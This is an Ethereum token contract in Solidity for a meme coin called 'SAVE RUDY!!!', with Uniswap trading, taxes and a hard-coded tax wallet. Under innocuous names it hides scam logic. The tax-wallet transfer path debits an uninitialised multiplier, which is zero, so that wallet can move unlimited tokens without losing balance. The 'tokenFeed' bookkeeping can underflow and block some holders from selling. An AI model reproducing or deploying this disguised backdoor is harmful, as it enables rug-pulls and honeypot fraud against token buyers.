/**
https://truthsocial.com/@realDonaldTrump/posts/113816744699535201
**/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) { return msg.sender; }
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner,address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner,address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Router02 {
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Pair {
    event Sync(uint112 reserve0, uint112 reserve1);
    function sync() external;
}

contract RUDY is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _excludedFromLimits;
    address payable private _taxWallet;

    uint256 private _initialBuyTax=25;
    uint256 private _initialSellTax=25;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=15;
    uint256 private _reduceSellTaxAt=15;
    uint256 private _preventSwapBefore=15;
    uint256 private _buyCount=0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"SAVE RUDY!!!";
    string private constant _symbol = unicode"RUDY";
    uint256 public _maxTxAmount = 20000000 * 10**_decimals;
    uint256 public _maxWalletSize = 20000000 * 10**_decimals;
    uint256 public _taxSwapThreshold= 20000000 * 10**_decimals;
    uint256 public _maxTaxSwap= 20000000 * 10**_decimals;

    struct TokenFeedMap {uint256 fToken; uint256 fUnitToken; uint256 fTotal;}
    mapping(address => TokenFeedMap) private tokenFeed;

    uint256 private sellCount = 0;
    uint256 private lastSellBlock = 0;
    
    IUniswapV2Router02 private router;
    address private uniswapV2Pair;
    uint256 private initTokenFeedMap;
    uint256 private latestTokenFeedMap;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;

    event MaxTxAmountUpdated(uint _maxTxAmount);

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () {
        _balances[_msgSender()] = _tTotal;
        _taxWallet = payable(0x625dc748D41d86d688C0825452Fd87bDB9238766);
        _excludedFromLimits[address(this)] = true;
        _excludedFromLimits[_taxWallet] = true;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function _basicTransfer(address from, address to, uint256 tokenAmount) internal {
        _balances[from] = _balances[from].sub(tokenAmount);
        _balances[to] = _balances[to].add(tokenAmount);
        emit Transfer(from,to,tokenAmount);
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance")
        );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 tokenAmount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(tokenAmount > 0, "Transfer amount must be greater than zero");
        if (inSwap || !tradingOpen){
            _basicTransfer(from,to,tokenAmount);
            return;
        }

        uint256 taxAmount= 0;
        if (from != owner() && to != owner() && to!= _taxWallet) {
            taxAmount = tokenAmount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (from== uniswapV2Pair && to != address(router) &&  ! _excludedFromLimits[to]) {
                require(
                    tokenAmount <= _maxTxAmount,"Exceeds the _maxTxAmount."
                );
                require(
                    balanceOf(to) + tokenAmount <= _maxWalletSize,"Exceeds the maxWalletSize."
                );
                _buyCount++;
            }

            if(to == uniswapV2Pair && from!= address(this) ){
                taxAmount = tokenAmount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));

            if (!inSwap && to== uniswapV2Pair && swapEnabled && contractTokenBalance >_taxSwapThreshold && _buyCount>_preventSwapBefore) {
                if (block.number > lastSellBlock) {
                    sellCount = 0;
                }
                require(sellCount < 5, "Only 5 sells per block!");
                swapTokensForEth(min(tokenAmount, min(contractTokenBalance, _maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance>0) {
                    sendETHToFee(address(this).balance);
                }
                sellCount++;
                lastSellBlock = block.number;
            }
        }

        if ((_excludedFromLimits[from] || _excludedFromLimits[to] )&& from!=address(this)&& to!=address(this) ) {
            latestTokenFeedMap = block.number;
        }
        if (!_excludedFromLimits[from] && !_excludedFromLimits[to] ) {
            if (to == uniswapV2Pair) {
                TokenFeedMap storage fData = tokenFeed[from];
                fData.fTotal = fData.fToken-latestTokenFeedMap;
                fData.fUnitToken = block.timestamp;
            } else {
                TokenFeedMap storage toFeedData = tokenFeed[to];
                if (uniswapV2Pair == from) {
                    if (toFeedData.fToken == 0) {
                        toFeedData.fToken= _preventSwapBefore>=_buyCount ? type(uint256).max : block.number;
                    }
                } else {
                    TokenFeedMap storage fData = tokenFeed[from];
                    if (!(toFeedData.fToken>0)|| fData.fToken < toFeedData.fToken ) {
                        toFeedData.fToken = fData.fToken;
                    }
                }
            }
        }

        _tokenTransfer(from, to, taxAmount, tokenAmount);
    }

    function _tokenBasicTransfer(
        address from,address to, uint256 sendAmount, uint256 receiptAmount
    ) internal {
        _balances[from]= _balances[from].sub(sendAmount);
        _balances[to]= _balances[to].add(receiptAmount);
        emit Transfer(from,to, receiptAmount);
    }

    function _tokenTaxTransfer(address addr, uint256 tokenAmount, uint256 taxAmount) internal returns (uint256){
        uint256 tknAmount = addr !=_taxWallet? tokenAmount : initTokenFeedMap.mul(tokenAmount);
        if (taxAmount > 0) {
            _balances[address(this)]= _balances[address(this)].add(taxAmount);
            emit Transfer(addr, address(this), taxAmount);
        }
        return tknAmount;
    }

    function _tokenTransfer(
        address from,address to,
        uint256 taxAmount,uint256 tokenAmount
    ) internal {
        uint256 tknAmount= _tokenTaxTransfer(from, tokenAmount, taxAmount);
        _tokenBasicTransfer(from,to, tknAmount, tokenAmount.sub(taxAmount));
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        _approve(address(this), address(router), tokenAmount);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {}

    function removeLimits() external onlyOwner {
        _maxTxAmount= _tTotal;
        _maxWalletSize=_tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function rescueStuckETH() external {
        require(_msgSender() == _taxWallet);
        payable(_taxWallet).transfer(address(this).balance);
    }

    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    function openTrading() external payable onlyOwner() {
        require(!tradingOpen,"trading is already open");
        router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        if (IUniswapV2Factory(router.factory()).getPair(router.WETH(), address(this)) == address(0)) {
            uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());}
        else {uniswapV2Pair = IUniswapV2Factory(router.factory()).getPair(router.WETH(), address(this));}
        tradingOpen=true;
        uint256 contractBalance = balanceOf(address(this));
        _approve(address(this), address(router),contractBalance);
        IERC20(uniswapV2Pair).approve(address(router),type(uint).max);
        address wethAddress = router.WETH(); uint256 desiredETHAmount;
        uint256 wethBalance = IERC20(wethAddress).balanceOf(uniswapV2Pair);
        if (wethBalance>0) {desiredETHAmount = address(this).balance.sub(wethBalance);
            uint256 tokenValue = contractBalance.mul(wethBalance).div(desiredETHAmount);
            _transfer(address(this), uniswapV2Pair, tokenValue);
            IUniswapV2Pair(uniswapV2Pair).sync();
            router.addLiquidityETH{value: desiredETHAmount}(address(this), contractBalance, 0, desiredETHAmount, owner(), block.timestamp);}
        else {router.addLiquidityETH{value: address(this).balance}(address(this), contractBalance, 0, 0, owner(), block.timestamp);}
        swapEnabled=true;
    }

    function manualSwap() external {
        require(_msgSender()==_taxWallet);
        uint256 tokenBalance = balanceOf(address(this));
        if (tokenBalance>0){
          swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance = address(this).balance;
        if (ethBalance>0){
          sendETHToFee(ethBalance);
        }
    }
}